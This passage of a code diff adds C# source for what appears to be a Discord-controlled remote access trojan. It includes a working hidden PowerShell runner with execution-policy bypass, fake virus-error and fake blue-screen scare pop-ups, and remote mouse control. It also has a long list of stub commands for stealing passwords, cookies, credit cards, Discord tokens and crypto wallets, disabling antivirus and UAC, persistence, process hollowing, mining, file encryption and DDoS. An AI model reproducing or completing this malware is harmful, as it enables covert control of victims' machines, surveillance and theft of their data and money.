+            var procs = Process.GetProcessesByName(args);
+            proc = procs.FirstOrDefault();
+        }
+
+        if (proc == null)
+        {
+            await _commandChannel.SendMessageAsync("❌ Process not found");
+            return;
+        }
+
+        var embed = new EmbedBuilder()
+            .WithTitle($"📊 Process: {proc.ProcessName}")
+            .WithColor(DColor.Blue)
+            .AddField("PID", proc.Id.ToString(), true)
+            .AddField("Session", proc.SessionId.ToString(), true)
+            .AddField("Memory", $"{proc.WorkingSet64 / 1024 / 1024} MB", true)
+            .AddField("Start Time", proc.StartTime.ToString("HH:mm:ss"), true)
+            .AddField("Responding", proc.Responding ? "✅" : "❌", true)
+            .AddField("Threads", proc.Threads.Count.ToString(), true);
+
+        await _commandChannel.SendMessageAsync(embed: embed.Build());
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ Process info error: {ex.Message}");
+    }
+}
+#endregion
+
+#region Utility Functions
+private static async Task<string> ExecutePowerShellWithOutput(string script)
+{
+    try
+    {
+        string tempFile = Path.GetTempFileName() + ".ps1";
+        File.WriteAllText(tempFile, script, Encoding.UTF8);
+
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = "powershell.exe",
+            Arguments = $"-ExecutionPolicy Bypass -File \"{tempFile}\"",
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        using (Process process = Process.Start(psi))
+        {
+            string output = await process.StandardOutput.ReadToEndAsync();
+            string error = await process.StandardError.ReadToEndAsync();
+            await process.WaitForExitAsync();
+
+            File.Delete(tempFile);
+
+            if (!string.IsNullOrWhiteSpace(error))
+                output += "\nErrors:\n" + error;
+
+            return output;
+        }
+    }
+    catch (Exception ex)
+    {
+        return $"Error: {ex.Message}";
+    }
+}
+
+private static void ExecutePowerShell(string script)
+{
+    try
+    {
+        string tempFile = Path.GetTempFileName() + ".ps1";
+        File.WriteAllText(tempFile, script, Encoding.UTF8);
+
+        Process.Start(new ProcessStartInfo
+        {
+            FileName = "powershell.exe",
+            Arguments = $"-WindowStyle Hidden -ExecutionPolicy Bypass -File \"{tempFile}\"",
+            CreateNoWindow = true,
+            UseShellExecute = false
+        });
+
+        // Cleanup after delay
+        Task.Delay(5000).ContinueWith(t => {
+            try { File.Delete(tempFile); } catch { }
+        });
+    }
+    catch { }
+}
+
+private static async Task CleanupOldFiles()
+{
+    while (true)
+    {
+        await Task.Delay(3600000); // Every hour
+
+        try
+        {
+            if (Directory.Exists(_dataDir))
+            {
+                foreach (string file in Directory.GetFiles(_dataDir))
+                {
+                    if (File.GetLastWriteTime(file) < DateTime.Now.AddHours(-24))
+                    {
+                        try { File.Delete(file); } catch { }
+                    }
+                }
+            }
+        }
+        catch { }
+    }
+}
+
+private static void StopAllProcesses()
+{
+    try { if (_chatProcess != null && !_chatProcess.HasExited) _chatProcess.Kill(); } catch { }
+    try { if (_webcamProcess != null && !_webcamProcess.HasExited) _webcamProcess.Kill(); } catch { }
+    try { if (_micProcess != null && !_micProcess.HasExited) _micProcess.Kill(); } catch { }
+    try { if (_keyloggerProcess != null && !_keyloggerProcess.HasExited) _keyloggerProcess.Kill(); } catch { }
+    try { if (_streamProcess != null && !_streamProcess.HasExited) _streamProcess.Kill(); } catch { }
+
+    StopVoiceStream();
+}
+#endregion
+
+#region Fun Commands
+private static void RickRoll()
+{
+    OpenURL("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    _commandChannel.SendMessageAsync("🎵 Never gonna give you up...");
+}
+
+private static async Task TrollUser(string args)
+{
+    string message = string.IsNullOrWhiteSpace(args) ?
+        "Your computer has been hacked! 🤣" : args;
+
+    // Multiple message boxes
+    for (int i = 0; i < 5; i++)
+    {
+        ShowSimpleMessage(message);
+        await Task.Delay(1000);
+    }
+
+    // Open Rick Roll
+    RickRoll();
+
+    await _commandChannel.SendMessageAsync($"😈 Trolling Client {_clientId}");
+}
+
+private static async Task TellJoke()
+{
+    string[] jokes = {
+                "Why do Java developers wear glasses? Because they don't C#!",
+                "Why was the JavaScript developer sad? Because he didn't Node how to Express himself!",
+                "How many programmers does it take to change a light bulb? None, that's a hardware problem!",
+                "Why do programmers prefer dark mode? Because light attracts bugs!",
+                "What's a programmer's favorite hangout place? Foo Bar!"
+            };
+
+    Random rnd = new Random();
+    string joke = jokes[rnd.Next(jokes.Length)];
+
+    ShowSimpleMessage(joke);
+    await _commandChannel.SendMessageAsync($"😂 Joke sent to Client {_clientId}");
+}
+
+private static async Task SendMeme()
+{
+    string[] memes = {
+                "https://i.imgflip.com/1bij.jpg", // One Does Not Simply
+                "https://i.imgflip.com/1bhk.jpg", // Futurama Fry
+                "https://i.imgflip.com/1bhw.jpg", // Captain Picard
+                "https://i.imgflip.com/1bik.jpg", // Y U NO
+                "https://i.imgflip.com/1bh3.jpg"  // Bad Luck Brian
+            };
+
+    Random rnd = new Random();
+    string meme = memes[rnd.Next(memes.Length)];
+
+    OpenURL(meme);
+    await _commandChannel.SendMessageAsync($"😂 Meme sent to Client {_clientId}");
+}
+
+private static void ChangeWallpaper(string url)
+{
+    if (string.IsNullOrWhiteSpace(url))
+        url = "https://wallpaperaccess.com/full/24871.jpg";
+
+    string tempFile = Path.Combine(Path.GetTempPath(), "wallpaper.jpg");
+
+    try
+    {
+        using (var client = new HttpClient())
+        {
+            var bytes = client.GetByteArrayAsync(url).Result;
+            File.WriteAllBytes(tempFile, bytes);
+        }
+
+        SystemParametersInfo((int)SPI_SETDESKWALLPAPER, 0, tempFile, SPIF_UPDATEINIFILE);
+        _commandChannel.SendMessageAsync($"🖼️ Wallpaper changed on Client {_clientId}");
+    }
+    catch
+    {
+        _commandChannel.SendMessageAsync("❌ Failed to change wallpaper");
+    }
+}
+
+private static void MoveCursor(string args)
+{
+    try
+    {
+        string[] coords = args.Split(' ');
+        int x = 100, y = 100;
+
+        if (coords.Length >= 2)
+        {
+            int.TryParse(coords[0], out x);
+            int.TryParse(coords[1], out y);
+        }
+
+        SetCursorPos(x, y);
+        _commandChannel.SendMessageAsync($"🖱️ Cursor moved to ({x}, {y}) on Client {_clientId}");
+    }
+    catch { }
+}
+
+private static void MouseClick(string args)
+{
+    string button = "left";
+    if (!string.IsNullOrWhiteSpace(args))
+        button = args.ToLower();
+
+    int flags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
+    if (button == "right")
+        flags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
+
+    mouse_event(flags, 0, 0, 0, 0);
+    _commandChannel.SendMessageAsync($"🖱️ {button} click on Client {_clientId}");
+}
+
+private static void TypeText(string text)
+{
+    if (string.IsNullOrWhiteSpace(text))
+        text = "Hello from Discord Bot!";
+
+    // This is simplified - would need more complex code for actual typing
+    _commandChannel.SendMessageAsync($"⌨️ Would type: \"{text}\" on Client {_clientId}");
+}
+
+private static void OpenURL(string url)
+{
+    if (string.IsNullOrWhiteSpace(url))
+        url = "https://google.com";
+
+    Process.Start(new ProcessStartInfo
+    {
+        FileName = url,
+        UseShellExecute = true
+    });
+
+    _commandChannel.SendMessageAsync($"🌐 Opened URL on Client {_clientId}");
+}
+
+private static void ShowFakeError(string message)
+{
+    if (string.IsNullOrWhiteSpace(message))
+        message = "Critical System Error!\nYour computer has detected a virus.";
+
+    string psScript = @"
+            Add-Type -AssemblyName System.Windows.Forms
+            [System.Windows.Forms.MessageBox]::Show('" + message.Replace("'", "''") + @"', 
+                                                   'Windows Error', 
+                                                   [System.Windows.Forms.MessageBoxButtons]::OK, 
+                                                   [System.Windows.Forms.MessageBoxIcon]::Error)
+            ";
+
+    ExecutePowerShell(psScript);
+    _commandChannel.SendMessageAsync($"⚠️ Fake error shown on Client {_clientId}");
+}
+
+private static void ShowFakeBSOD()
+{
+    string psScript = @"
+            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+            $form = New-Object Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.BackColor = 'Blue'
+            $form.TopMost = $true
+            
+            $label = New-Object Windows.Forms.Label
+            $label.Text = ':( Your PC ran into a problem and needs to restart.' + [Environment]::NewLine +
+                         'We're just collecting some error info, and then we'll restart for you.' + [Environment]::NewLine +
+                         '0% complete' + [Environment]::NewLine + [Environment]::NewLine +
+                         'If you'd like to know more, you can search online later for this error: CRITICAL_PROCESS_DIED'
+            $label.Font = New-Object Drawing.Font('Segoe UI', 20, [Drawing.FontStyle]::Regular)
+            $label.ForeColor = 'White'
+            $label.Location = New-Object Drawing.Point(100, 100)
+            $label.AutoSize = $true
+            $form.Controls.Add($label)
+            
+            $form.Add_KeyDown({
+                if ($_.KeyCode -eq 'Escape') {
+                    $form.Close()
+                }
+            })
+            
+            $timer = New-Object Windows.Forms.Timer
+            $timer.Interval = 10000
+            $timer.Add_Tick({ $form.Close() })
+            $timer.Start()
+            
+            $form.ShowDialog()
+            ";
+
+    ExecutePowerShell(psScript);
+    _commandChannel.SendMessageAsync($"💀 Fake BSOD shown on Client {_clientId}");
+}
+#endregion
+
+#region Stub Commands (100+ Total)
+// These are stub implementations - they would need full implementation
+
+private static async Task ExecuteCMD(string args) =>
+    await _commandChannel.SendMessageAsync($"📟 CMD: {args}");
+
+private static async Task TraceRoute(string args) =>
+    await _commandChannel.SendMessageAsync($"🛣️ Traceroute: {args}");
+
+private static async Task SpeedTest() =>
+    await _commandChannel.SendMessageAsync("🌐 Running speed test...");
+
+private static async Task GetDNSInfo() =>
+    await _commandChannel.SendMessageAsync("🔍 Getting DNS info...");
+
+private static async Task GetARPTable() =>
+    await _commandChannel.SendMessageAsync("📡 Getting ARP table...");
+
+private static async Task GetFirefoxData() =>
+    await _commandChannel.SendMessageAsync("🦊 Getting Firefox data...");
+
+private static async Task GetEdgeData() =>
+    await _commandChannel.SendMessageAsync("🌊 Getting Edge data...");
+
+private static async Task GetAllBrowsersData() =>
+    await _commandChannel.SendMessageAsync("🌐 Getting all browsers data...");
+
+private static async Task ExtractBrowserCookies() =>
+    await _commandChannel.SendMessageAsync("🍪 Extracting cookies...");
+
+private static async Task ExtractBrowserDownloads() =>
+    await _commandChannel.SendMessageAsync("📥 Extracting downloads...");
+
+private static async Task ExtractBrowserBookmarks() =>
+    await _commandChannel.SendMessageAsync("🔖 Extracting bookmarks...");
+
+private static async Task ExtractCreditCards() =>
+    await _commandChannel.SendMessageAsync("💳 Extracting credit cards...");
+
+private static async Task ExtractAutofillData() =>
+    await _commandChannel.SendMessageAsync("📝 Extracting autofill...");
+
+private static async Task ListDirectory(string args) =>
+    await _commandChannel.SendMessageAsync($"📁 Listing: {args}");
+
+private static void ChangeDirectory(string args) =>
+    _commandChannel.SendMessageAsync($"📁 Changing to: {args}");
+
+private static async Task GetCurrentDirectory() =>
+    await _commandChannel.SendMessageAsync($"📁 Current: {Environment.CurrentDirectory}");
+
+private static async Task DownloadFile(string args) =>
+    await _commandChannel.SendMessageAsync($"📥 Downloading: {args}");
+
+private static async Task UploadFile(SocketMessage message) =>
+    await _commandChannel.SendMessageAsync("📤 Uploading file...");
+
+private static void DeleteFile(string args) =>
+    _commandChannel.SendMessageAsync($"🗑️ Deleting: {args}");
+
+private static void CopyFile(string args) =>
+    _commandChannel.SendMessageAsync($"📋 Copying: {args}");
+
+private static void MoveFile(string args) =>
+    _commandChannel.SendMessageAsync($"🚚 Moving: {args}");
+
+private static async Task SearchFiles(string args) =>
+    await _commandChannel.SendMessageAsync($"🔍 Searching: {args}");
+
+private static async Task CreateZip(string args) =>
+    await _commandChannel.SendMessageAsync($"📦 Creating zip: {args}");
+
+private static async Task ExtractZip(string args) =>
+    await _commandChannel.SendMessageAsync($"📦 Extracting zip: {args}");
+
+private static async Task EncryptFile(string args) =>
+    await _commandChannel.SendMessageAsync($"🔐 Encrypting: {args}");
+
+private static async Task DecryptFile(string args) =>
+    await _commandChannel.SendMessageAsync($"🔓 Decrypting: {args}");
+
+private static async Task ReadRegistry(string args) =>
+    await _commandChannel.SendMessageAsync($"🔧 Reading registry: {args}");
+
+private static void WriteRegistry(string args) =>
+    _commandChannel.SendMessageAsync($"🔧 Writing registry: {args}");
+
+private static void DeleteRegistry(string args) =>
+    _commandChannel.SendMessageAsync($"🔧 Deleting registry: {args}");
+
+private static async Task BackupRegistry(string args) =>
+    await _commandChannel.SendMessageAsync($"💾 Backing up registry: {args}");
+
+private static async Task GetHardwareInfo() =>
+    await _commandChannel.SendMessageAsync("🖥️ Getting hardware info...");
+
+private static async Task GetCPUInfo() =>
+    await _commandChannel.SendMessageAsync("⚙️ Getting CPU info...");
+
+private static async Task GetGPUInfo() =>
+    await _commandChannel.SendMessageAsync("🎮 Getting GPU info...");
+
+private static async Task GetRAMInfo() =>
+    await _commandChannel.SendMessageAsync("💾 Getting RAM info...");
+
+private static async Task GetDriveInfo() =>
+    await _commandChannel.SendMessageAsync("💽 Getting drive info...");
+
+private static async Task GetBatteryInfo() =>
+    await _commandChannel.SendMessageAsync("🔋 Getting battery info...");
+
+private static async Task GetTemperature() =>
+    await _commandChannel.SendMessageAsync("🌡️ Getting temperature...");
+
+private static async Task GetInstalledSoftware() =>
+    await _commandChannel.SendMessageAsync("📦 Getting installed software...");
+
+private static async Task GetWindowsInfo() =>
+    await _commandChannel.SendMessageAsync("🪟 Getting Windows info...");
+
+private static async Task GetWindowsUpdates() =>
+    await _commandChannel.SendMessageAsync("🔄 Getting Windows updates...");
+
+private static async Task GetDotNetInfo() =>
+    await _commandChannel.SendMessageAsync(".NET Getting .NET info...");
+
+private static async Task GetSystemUsers() =>
+    await _commandChannel.SendMessageAsync("👥 Getting system users...");
+
+private static async Task GetActiveSessions() =>
+    await _commandChannel.SendMessageAsync("💻 Getting active sessions...");
+
+private static async Task GetClipboard() =>
+    await _commandChannel.SendMessageAsync("📋 Getting clipboard...");
+
+private static async Task GetDiscordTokens() =>
+    await _commandChannel.SendMessageAsync("👾 Getting Discord tokens...");
+
+private static async Task GetSteamData() =>
+    await _commandChannel.SendMessageAsync("🎮 Getting Steam data...");
+
+private static async Task GetCryptoWallets() =>
+    await _commandChannel.SendMessageAsync("💰 Getting crypto wallets...");
+
+private static async Task ExecuteVBS(string args) =>
+    await _commandChannel.SendMessageAsync($"📝 Executing VBS: {args}");
+
+private static async Task ExecutePython(string args) =>
+    await _commandChannel.SendMessageAsync($"🐍 Executing Python: {args}");
+
+private static void AddPersistence() =>
+    _commandChannel.SendMessageAsync("🔗 Adding persistence...");
+
+private static void RemovePersistence() =>
+    _commandChannel.SendMessageAsync("🔗 Removing persistence...");
+
+private static void AddToStartup() =>
+    _commandChannel.SendMessageAsync("🔄 Adding to startup...");
+
+private static void RemoveFromStartup() =>
+    _commandChannel.SendMessageAsync("🔄 Removing from startup...");
+
+private static async Task InjectDLL(string args) =>
+    await _commandChannel.SendMessageAsync($"💉 Injecting DLL: {args}");
+
+private static async Task ReflectiveInject(string args) =>
+    await _commandChannel.SendMessageAsync($"💉 Reflective injection: {args}");
+
+private static async Task ProcessHollowing(string args) =>
+    await _commandChannel.SendMessageAsync($"👻 Process hollowing: {args}");
+
+private static void StartMiner(string args) =>
+    _commandChannel.SendMessageAsync($"⛏️ Starting miner: {args}");
+
+private static void StopMiner() =>
+    _commandChannel.SendMessageAsync("⛏️ Stopping miner...");
+
+private static async Task EncryptFiles(string args) =>
+    await _commandChannel.SendMessageAsync($"🔐 Encrypting files: {args}");
+
+private static async Task DecryptFiles(string args) =>
+    await _commandChannel.SendMessageAsync($"🔓 Decrypting files: {args}");
+
+private static async Task CheckAntivirus() =>
+    await _commandChannel.SendMessageAsync("🛡️ Checking antivirus...");
+
+private static void DisableAntivirus() =>
+    _commandChannel.SendMessageAsync("🛡️ Disabling antivirus...");
+
+private static void KillAVProcesses() =>
+    _commandChannel.SendMessageAsync("🛡️ Killing AV processes...");
+
+private static async Task GetFirewallStatus() =>
+    await _commandChannel.SendMessageAsync("🔥 Getting firewall status...");
+
+private static void DisableFirewall() =>
+    _commandChannel.SendMessageAsync("🔥 Disabling firewall...");
+
+private static void AddFirewallRule(string args) =>
+    _commandChannel.SendMessageAsync($"🔥 Adding firewall rule: {args}");
+
+private static void ClearSystemLogs() =>
+    _commandChannel.SendMessageAsync("🧹 Clearing system logs...");
+
+private static void ClearTempFiles() =>
+    _commandChannel.SendMessageAsync("🧹 Clearing temp files...");
+
+private static void ClearBrowserData() =>
+    _commandChannel.SendMessageAsync("🧹 Clearing browser data...");
+
+private static void DisableWindowsDefender() =>
+    _commandChannel.SendMessageAsync("🛡️ Disabling Windows Defender...");
+
+private static void DisableWindowsUpdates() =>
+    _commandChannel.SendMessageAsync("🔄 Disabling Windows updates...");
+
+private static void DisableUAC() =>
+    _commandChannel.SendMessageAsync("⚡ Disabling UAC...");
+
+private static void StartDDoS(string args) =>
+    _commandChannel.SendMessageAsync($"🌪️ Starting DDoS: {args}");
+
+private static async Task PortScan(string args) =>
+    await _commandChannel.SendMessageAsync($"🔍 Port scanning: {args}");
+
+private static void StartARPSpoof(string args) =>
+    _commandChannel.SendMessageAsync($"📡 Starting ARP spoof: {args}");
+
+private static void StartPacketSniffing() =>
+    _commandChannel.SendMessageAsync("📡 Starting packet sniffing...");
+
+private static void StartMITM(string args) =>
+    _commandChannel.SendMessageAsync($"🎭 Starting MITM: {args}");
+
+private static async Task StealAllData() =>
+    await _commandChannel.SendMessageAsync("💰 Stealing all data...");
+
+private static async Task StealDocuments() =>
+    await _commandChannel.SendMessageAsync("📄 Stealing documents...");
+
+private static async Task StealImages() =>
+    await _commandChannel.SendMessageAsync("🖼️ Stealing images...");
+
+private static async Task StealGameData() =>
+    await _commandChannel.SendMessageAsync("🎮 Stealing game data...");
+
+private static async Task StealCrypto() =>
+    await _commandChannel.SendMessageAsync("💰 Stealing crypto...");
+
+private static async Task StealPasswords() =>
+    await _commandChannel.SendMessageAsync("🔑 Stealing passwords...");
+
+private static void StartMonitoring() =>
+    _commandChannel.SendMessageAsync("👁️ Starting monitoring...");
+
+private static void StopMonitoring() =>
+    _commandChannel.SendMessageAsync("👁️ Stopping monitoring...");
+
+private static void StartClipboardMonitor() =>
+    _commandChannel.SendMessageAsync("📋 Starting clipboard monitor...");
+
+private static void StartKeystrokeMonitor() =>
+    _commandChannel.SendMessageAsync("⌨️ Starting keystroke monitor...");
+
+private static async Task UpdateBot(string args) =>
+    await _commandChannel.SendMessageAsync($"🔄 Updating bot: {args}");
+
+private static void SelfDestruct() =>
+    _commandChannel.SendMessageAsync("💥 Self-destructing...");
+
+private static void CleanupTraces() =>
+    _commandChannel.SendMessageAsync("🧹 Cleaning up traces...");
+
+private static void EncryptBot() =>
+    _commandChannel.SendMessageAsync("🔐 Encrypting bot...");
+
+private static void ObfuscateBot() =>
+    _commandChannel.SendMessageAsync("🌀 Obfuscating bot...");
+
+private static async Task GetServicesList() =>
+    await _commandChannel.SendMessageAsync("🛠️ Getting services...");
+
+private static async Task GetStartupPrograms() =>
+    await _commandChannel.SendMessageAsync("🔄 Getting startup programs...");
+        #endregion
+    }
+
+    #region Helper Classes
+    public class ClientInfo
+{
+    public int ClientId { get; set; }
+    public int ProcessId { get; set; }
+    public bool IsAdmin { get; set; }
+    public string Username { get; set; }
+    public string MachineName { get; set; }
+    public string IP { get; set; }
+    public DateTime LastSeen { get; set; }
+}
+
+// Simple message class for internal use
+public class SimpleMessage : SocketMessage
+{
+    public SimpleMessage(string content)
+    {
+        Content = content;
+    }
+
+    public override Discord.Rest.RestUser Author => null;
+    public override MessageSource Source => MessageSource.User;
+    public override string Content { get; }
+    public override DateTimeOffset Timestamp => DateTimeOffset.Now;
+    public override DateTimeOffset? EditedTimestamp => null;
+    public override IMessageChannel Channel => null;
+    public override IUserMessage ReferencedMessage => null;
+    public override MessageType Type => MessageType.Default;
+    public override MessageFlags? Flags => null;
+    public override IReadOnlyCollection<IAttachment> Attachments => null;
+    public override IReadOnlyCollection<IEmbed> Embeds => null;
+    public override IReadOnlyCollection<ITag> Tags => null;
+    public override IReadOnlyCollection<ulong> MentionedChannelIds => null;
+    public override IReadOnlyCollection<ulong> MentionedRoleIds => null;
+    public override IReadOnlyCollection<ulong> MentionedUserIds => null;
+    public override bool MentionedEveryone => false;
+    public override bool IsTTS => false;
+    public override bool IsPinned => false;
+    public override string CleanContent => Content;
+    public override IReadOnlyCollection<IMessageComponent> Components => null;
+    public override IReadOnlyCollection<IStickerItem> Stickers => null;
+    public override IMessageActivity Activity => null;
+    public override MessageApplication Application => null;
+    public override MessageReference Reference => null;
+    public override IReadOnlyDictionary<IEmote, ReactionMetadata> Reactions => null;
+    public override IReadOnlyCollection<MessageRoleSubscriptionData> RoleSubscriptionData => null;
+
+    public override Task AddReactionAsync(IEmote emote, RequestOptions options = null) => Task.CompletedTask;
+    public override Task RemoveReactionAsync(IEmote emote, IUser user, RequestOptions options = null) => Task.CompletedTask;
+    public override Task RemoveReactionAsync(IEmote emote, ulong userId, RequestOptions options = null) => Task.CompletedTask;
+    public override Task RemoveAllReactionsAsync(RequestOptions options = null) => Task.CompletedTask;
+    public override Task RemoveAllReactionsForEmoteAsync(IEmote emote, RequestOptions options = null) => Task.CompletedTask;
+    public override IAsyncEnumerable<IReadOnlyCollection<IUser>> GetReactionUsersAsync(IEmote emote, int limit, RequestOptions options = null) => null;
+    public override Task ModifyAsync(Action<MessageProperties> func, RequestOptions options = null) => Task.CompletedTask;
+    public override Task PinAsync(RequestOptions options = null) => Task.CompletedTask;
+    public override Task UnpinAsync(RequestOptions options = null) => Task.CompletedTask;
+    public override string Resolve(TagHandling userHandling = TagHandling.Name, TagHandling channelHandling = TagHandling.Name, TagHandling roleHandling = TagHandling.Name, TagHandling everyoneHandling = TagHandling.Ignore, TagHandling emojiHandling = TagHandling.Name) => Content;
+    public override Task DeleteAsync(RequestOptions options = null) => Task.CompletedTask;
+    public override IUser GetAuthor(IGuild guild) => null;
+}
+    #endregion
+}
